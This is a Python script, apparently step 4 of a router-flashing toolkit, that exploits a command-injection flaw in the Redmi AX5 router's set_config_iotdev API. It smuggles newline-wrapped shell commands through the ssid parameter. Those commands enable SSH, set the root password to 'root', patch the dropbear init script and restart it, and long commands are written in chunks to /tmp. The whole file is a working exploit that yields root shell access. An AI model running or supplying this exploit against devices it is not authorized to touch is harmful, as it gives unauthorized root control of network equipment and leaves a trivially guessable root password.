#!/usr/bin/env python3
# AX5 步骤 4：通过 set_config_iotdev ssid 注入启用 SSH
#
# 适用机型: Redmi AX5 (RA67 / RM1800) — IPQ6000
# 漏洞原理: set_config_iotdev API 的 ssid 参数值无转义写入配置文件，
#           该文件被 shell 脚本 source 执行时，注入的 \n<cmd>\n 作为独立行运行
# 前置:    路由器已降级到 1.0.26（步骤 3）+ 重新初始化 + 重新登录获得 stok
# 后置:    路由器 SSH 端口 22 可连，用户 root 密码 root
# 来源:    old_coding/Auto_Flash_Router/AX5/enable_ssh.py
#
# ⚠️  与 AX6 的 smartcontroller 漏洞完全不同。AX5 通过 ssid 字段注入，
#     不需要本地 HTTP 服务器（直接注入命令，不走 curl | ash）。
#     ssid 字段有长度限制，长命令需分块写入 /tmp/e 再执行。
#
# 输出:    stdout = 单个 JSON  {"ok": bool, "step": ..., "data"|"error": ...}
#          stderr = 默认空白，--debug 时打印进度
#          exit  = 0 成功 / 1 失败

import argparse
import json
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

# ============ 常量 ============
DEFAULT_ROUTER_IP = "192.168.31.1"
DEFAULT_TIMEOUT = 30
SSH_PORT = 22
ROOT_PASSWORD = "root"
STEP_NAME = "enable_ssh"
DEBUG = False  # 运行时由 --debug 改写；默认静默

# ssid 字段有效命令长度上限（保守值，实机测试后调整）
# 注入格式: ssid = "\n<command>\n"，所以可用空间 = MAX - 2（两个换行符）
MAX_SSID_CMD_LEN = 30

# 分块写入的目标文件
CHUNK_FILE = "/tmp/e"
PWD_FILE = "/tmp/x"

# 特殊字符黑名单（echo -n "..." 内的危险字符）
SPECIAL_CHARS = ['"', "\\", "`", "$", "\n"]


# ============ 日志 / 输出 ============
def log(msg: str, level: str = "INFO") -> None:
    if not DEBUG:
        return
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    print(f"{ts} [{level}] {msg}", file=sys.stderr)


def emit_ok(data: dict) -> None:
    print(json.dumps({"ok": True, "step": STEP_NAME, "data": data}, ensure_ascii=False))


def emit_err(error: str, reason: str = "", recoverable: bool = True) -> None:
    out = {"ok": False, "step": STEP_NAME, "error": error,
           "recoverable": recoverable}
    if reason:
        out["reason"] = reason
    print(json.dumps(out, ensure_ascii=False))


# ============ HTTP 基础 ============
def http_get_json(url: str, timeout: int) -> dict:
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


# ============ ssid 注入核心 ============
def inject_ssid(base_url: str, stok: str, command: str,
                timeout: int = DEFAULT_TIMEOUT) -> dict:
    """通过 set_config_iotdev 的 ssid 字段注入一条命令。

    注入格式: ssid = "\\n<command>\\n"
    当配置文件被 source 时，\\n 使命令作为独立行执行。
    """
    payload = "\n" + command + "\n"
    params = urllib.parse.urlencode({
        "bssid": "gallifrey",
        "user_id": "doctor",
        "ssid": payload,
    })
    url = (f"{base_url}/cgi-bin/luci/;stok={stok}"
           f"/api/misystem/set_config_iotdev?{params}")
    try:
        result = http_get_json(url, timeout)
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")[:200]
        except Exception:
            pass
        raise RuntimeError(
            f"set_config_iotdev HTTP {e.code}: {body}"
        ) from e
    except urllib.error.URLError as e:
        # 路由器可能因注入命令立即执行导致连接中断
        log(f"请求异常（路由器可能已执行命令并断开）: {e}", level="WARN")
        return {"code": 0, "note": "connection interrupted (expected)"}
    return result


def exec_short_cmd(base_url: str, stok: str, cmd: str,
                   timeout: int = DEFAULT_TIMEOUT) -> None:
    """直接注入一条短命令（<= MAX_SSID_CMD_LEN 字节）。"""
    if len(cmd) > MAX_SSID_CMD_LEN:
        raise RuntimeError(
            f"命令过长 ({len(cmd)} > {MAX_SSID_CMD_LEN}): {cmd}"
        )
    log(f"注入短命令 ({len(cmd)}B): {cmd}")
    result = inject_ssid(base_url, stok, cmd, timeout)
    if result.get("code") != 0:
        raise RuntimeError(f"注入失败 (code={result.get('code')}): {result}")


def exec_long_cmd(base_url: str, stok: str, command: str,
                  fn: str = CHUNK_FILE,
                  timeout: int = DEFAULT_TIMEOUT) -> None:
    """分块写入文件再执行（用于超过 MAX_SSID_CMD_LEN 的命令）。

    通过多次 echo -n "chunk" >>/tmp/e 写入，最后 sh /tmp/e 执行。
    """
    log(f"分块写入长命令 ({len(command)}B): {command[:50]}...")

    # echo 模板的固定开销
    template = 'echo -n "{txt}"{amode}{fn}'
    overhead = len(template.format(txt="", amode="", fn=fn))
    max_chunk = MAX_SSID_CMD_LEN - overhead - 2  # 留 2 字节给 >>

    if max_chunk < 1:
        raise RuntimeError(
            f"MAX_SSID_CMD_LEN ({MAX_SSID_CMD_LEN}) 太小，连 echo 框架都装不下"
        )

    # 切块（避开特殊字符）
    chunks = []
    buf = ""
    for ch in command:
        if len(buf) >= max_chunk:
            chunks.append(buf)
            buf = ""
        if ch in SPECIAL_CHARS:
            if buf:
                chunks.append(buf)
            # 特殊字符单独处理
            chunks.append(ch)
            buf = ""
            continue
        buf += ch
    if buf:
        chunks.append(buf)

    # 逐块写入
    for i, chunk in enumerate(chunks):
        amode = ">" if i == 0 else ">>"
        spec = ""
        if len(chunk) == 1 and chunk in SPECIAL_CHARS:
            spec = "e"
            if chunk == "\n":
                chunk = "n"
            chunk = f"\\{chunk}"
        echo_cmd = template.format(txt=chunk, amode=amode, fn=fn)
        exec_short_cmd(base_url, stok, echo_cmd, timeout)

    # 执行
    exec_short_cmd(base_url, stok, f"sh {fn}", timeout)


# ============ SSH 探测 ============
def probe_ssh_port(host: str, port: int = SSH_PORT, timeout: int = 5) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# ============ 主流程 ============
def enable_ssh(base_url: str, stok: str, timeout: int) -> dict:
    host = base_url.split("//", 1)[1]  # 去掉 "http://"

    # 1. nvram 启用 SSH
    log("nvram 启用 SSH...")
    exec_short_cmd(base_url, stok, "nvram set ssh_en=1")
    exec_short_cmd(base_url, stok, "nvram commit")

    # 2. 设 root 密码
    log("设置 root 密码...")
    exec_short_cmd(base_url, stok, f"echo root >{PWD_FILE}")
    exec_short_cmd(base_url, stok, f"echo root >>{PWD_FILE}")
    exec_short_cmd(base_url, stok, f"passwd root <{PWD_FILE}")

    # 3. 解除 dropbear 的 release 检查（49 字节，超过限制，分块执行）
    log("解除 dropbear release 检查...")
    exec_long_cmd(base_url, stok,
                  "sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")

    # 4. 启动 dropbear
    log("启用 dropbear...")
    exec_short_cmd(base_url, stok, "/etc/init.d/dropbear enable")
    log("重启 dropbear...")
    exec_short_cmd(base_url, stok, "/etc/init.d/dropbear restart")

    # 5. TCP 探测 22 端口（多等几秒确保启动）
    log(f"探测 TCP {host}:{SSH_PORT}...")
    for attempt in range(11):
        if probe_ssh_port(host, SSH_PORT):
            log("SSH 已启用")
            break
        if attempt < 10:
            log(f"端口未就绪，再等...（{attempt+1}/10）")
            time.sleep(3)
    else:
        raise RuntimeError(
            f"SSH 端口 {SSH_PORT} 未打开"
            f"（可能 dropbear 的 release 检查卡住了，需 sed 修复）"
        )

    # 6. 清理 /tmp 中转文件
    log("清理 /tmp 中转文件...")
    try:
        exec_short_cmd(base_url, stok, f"rm -f {CHUNK_FILE} {PWD_FILE}")
    except Exception as e:
        log(f"清理失败（非阻塞，重启后 /tmp 自动清空）: {e}")

    return {"ip": host, "ssh_port": SSH_PORT, "root_password": ROOT_PASSWORD}


# ============ CLI ============
def help_json() -> None:
    schema = {
        "script": "enable_ssh",
        "description": "AX5 步骤 4：通过 set_config_iotdev ssid 注入启用 SSH",
        "args": [
            {"name": "--ip", "type": "string", "default": DEFAULT_ROUTER_IP,
             "required": False, "description": "路由器 IP"},
            {"name": "--stok", "type": "string", "default": "",
             "required": False, "description": "stok（来自步骤 2；空则从 stdin 读上游 JSON）"},
            {"name": "--timeout", "type": "int", "default": DEFAULT_TIMEOUT,
             "required": False, "description": "网络超时秒"},
            {"name": "--debug", "type": "flag", "default": False,
             "required": False, "description": "打印进度日志到 stderr"},
        ],
        "examples": [
            "python3 4.enable_ssh.py --stok <stok>",
            "python3 2.login_get_stok.py | python3 4.enable_ssh.py",
            "python3 2.login_get_stok.py | python3 4.enable_ssh.py --debug",
        ],
        "stdin_contract": {
            "expects": "上游 JSON（含 data.stok），可用 --stok 替代",
            "produces": "SSH 启用结果 JSON",
        },
    }
    print(json.dumps(schema, ensure_ascii=False))


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="AX5 步骤 4：启用 SSH（set_config_iotdev ssid 注入）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python3 4.enable_ssh.py --stok <stok>\n"
            "  python3 2.login_get_stok.py | python3 4.enable_ssh.py\n"
            "  python3 2.login_get_stok.py | python3 4.enable_ssh.py --debug\n"
        ),
    )
    p.add_argument("--ip", default=DEFAULT_ROUTER_IP,
                   help=f"路由器 IP（默认: {DEFAULT_ROUTER_IP}）")
    p.add_argument("--stok", default="",
                   help="stok（来自步骤 2；空则从 stdin 读上游 JSON）")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                   help=f"网络超时秒（默认: {DEFAULT_TIMEOUT}）")
    p.add_argument("--debug", action="store_true",
                   help="打印进度日志到 stderr（默认静默）")
    return p.parse_args()


def read_stok_from_stdin() -> str:
    """从上游管道 JSON 读 stok。上游 ok:false 时把 error 透传出来。"""
    if sys.stdin.isatty():
        raise RuntimeError("未通过 stdin 管道传入上游 JSON，也未传 --stok")
    text = sys.stdin.read()
    if not text.strip():
        raise RuntimeError("stdin 为空（上游没产出 JSON）")
    try:
        d = json.loads(text)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"上游 stdin 不是合法 JSON: {e}")
    if d.get("ok") is False:
        raise RuntimeError(f"上游失败: {d.get('error', '未知错误')}")
    stok = d.get("data", {}).get("stok", "")
    if not stok:
        raise RuntimeError(f"上游 JSON 没有 data.stok 字段: {d}")
    return stok


def main() -> int:
    global DEBUG
    if "--help-json" in sys.argv:
        help_json()
        return 0
    args = parse_args()
    DEBUG = args.debug

    try:
        stok = args.stok or read_stok_from_stdin()
    except RuntimeError as e:
        log(str(e), level="ERROR")
        emit_err(str(e))
        return 1

    base_url = f"http://{args.ip}"
    try:
        data = enable_ssh(base_url, stok, args.timeout)
    except Exception as e:
        log(str(e), level="ERROR")
        emit_err(str(e))
        return 1
    emit_ok(data)
    return 0


if __name__ == "__main__":
    sys.exit(main())
